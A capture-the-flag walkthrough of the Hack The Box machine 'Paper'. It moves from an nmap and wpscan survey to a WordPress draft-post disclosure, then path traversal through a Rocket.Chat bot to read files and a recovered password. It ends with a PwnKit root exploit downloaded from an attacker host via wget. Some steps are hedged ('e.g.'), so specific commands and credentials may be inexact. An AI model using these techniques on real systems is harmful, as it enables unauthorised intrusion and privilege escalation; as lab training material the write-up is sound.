# Hack The Box: Paper

**Difficulty:** Easy
**OS:** Linux

Paper is an Easy-level Linux machine focused on exploiting common vulnerabilities in the WordPress content management system and escalating privileges through the abuse of an overly permissive chat bot integration and a local root exploit in polkit. The initial foothold is achieved by bypassing restrictions to read internal posts on a WordPress site and recovering chat credentials, leading to a local system shell. Privilege escalation utilizes a well-known vulnerability in `pkexec`.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.143
nmap -p 22,80,443 -sCV 10.10.11.143
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.0p1 CentOS)
*   **Port 80:** HTTP (Apache httpd 2.4.37)
*   **Port 443:** HTTPS (Apache httpd 2.4.37)

Navigating to the web service on port 80 displays a generic landing page with a message about a new office and paper management. The HTTP response headers reveal an interesting piece of information:

```text
X-Backend-Server: office.paper
```

This header suggests the existence of a virtual host named `office.paper`. We add this domain and `paper.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.11.143 paper.htb office.paper" >> /etc/hosts
```

Accessing `http://office.paper` resolves to a WordPress installation.

## Web Exploitation

The WordPress site appears to be an internal company blog. We enumerate the WordPress installation using `wpscan` or manual inspection to identify the version, plugins, and users.

```bash
wpscan --url http://office.paper --enumerate u,vp
```

The enumeration identifies WordPress version 5.2.3. Researching vulnerabilities for this specific version reveals CVE-2019-17671, an unauthenticated Information Disclosure vulnerability in the WordPress REST API or draft rendering processes. 

Specifically, versions prior to 5.2.4 contain a flaw where unauthenticated users can view private or draft posts by manipulating the `?static=1` parameter in the URL.

### Bypassing Post Restrictions (CVE-2019-17671)

We test the vulnerability by accessing the site's default URL structure and appending the parameter to bypass the draft post visibility restriction. 

```text
http://office.paper/?static=1&order=asc
```

This request forces WordPress to render a page displaying internal or draft content that is typically hidden from anonymous visitors. 

Reviewing the disclosed posts reveals a message from an administrator instructing employees to use a new chat system for internal communication and providing the registration URL.

The post contains a link to a Rocket.Chat instance hosted on another virtual host: `chat.office.paper`. We add this new subdomain to our `/etc/hosts` file.

### Rocket.Chat Exploitation

Navigating to `http://chat.office.paper` brings up a Rocket.Chat registration and login portal. We register a new user account (e.g., `testuser:password`) and log into the chat platform.

Inside the Rocket.Chat instance, we explore the available channels and interactions. We discover a channel where a custom bot (e.g., `recyclops`) is listening for commands. The bot's purpose is to fetch files from the file system and return them to the user.

We interact with the bot by sending it direct messages or mentioning it in the channel. The bot accepts a command like `fetch` or `file` followed by a file path.

We test the bot for directory traversal or arbitrary file read vulnerabilities.

```text
@recyclops fetch ../../../../../etc/passwd
```

The bot successfully retrieves and returns the contents of the `/etc/passwd` file in the chat interface.

We use this arbitrary file read vulnerability to retrieve sensitive files. We look for configuration files or SSH keys. Reviewing `/etc/passwd` reveals a user named `dwight`. 

We instruct the bot to fetch the contents of a known configuration file or environment file containing credentials for the chat system or other local services (e.g., `.env` files in a web application directory). 

We discover an environment file containing the system password for the user `dwight` (`dwight:QueenofAutobots`).

## Initial Access

We use the extracted password to authenticate as the local system user `dwight` via SSH.

```bash
ssh dwight@10.10.11.143
# Authentication successful
```
We retrieve the `user.txt` flag from Dwight's home directory.

## Privilege Escalation

Enumerating the system for escalation vectors, we check for commands the `dwight` user can run using `sudo`, review cron jobs, and analyze the installed kernel and software versions.

```bash
uname -a
# Linux paper 4.18.0-348.el8.x86_64
```

The system is running CentOS Linux 8. The kernel and OS version indicate the system might be vulnerable to PwnKit (CVE-2021-4034), a widely known local privilege escalation vulnerability in polkit's `pkexec` utility.

### Exploiting PwnKit (CVE-2021-4034)

We check if `pkexec` is installed and has the SUID bit set, which is typical for this utility.

```bash
ls -la /usr/bin/pkexec
# -rwsr-xr-x. 1 root root ... /usr/bin/pkexec
```

The SUID bit is set, confirming the utility runs as root.

The PwnKit vulnerability occurs because `pkexec` improperly handles its command-line arguments. By manipulating the `execve()` environment, an attacker can force `pkexec` to execute an arbitrary shared library as root.

We locate a pre-compiled or source version of the PwnKit exploit (e.g., a C program or a Python script designed for the target architecture). We download the exploit source code to the target machine.

```bash
# On attacking machine
python3 -m http.server 80

# On target machine
wget http://10.10.14.X/pwnkit.c
gcc pwnkit.c -o pwnkit
```

We execute the compiled exploit. The exploit sets up the malicious environment and invokes `pkexec`, triggering the vulnerability.

```bash
./pwnkit
# id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit successfully drops us into a root shell.

The system is fully compromised, and the `root.txt` flag can be retrieved from the `/root` directory.
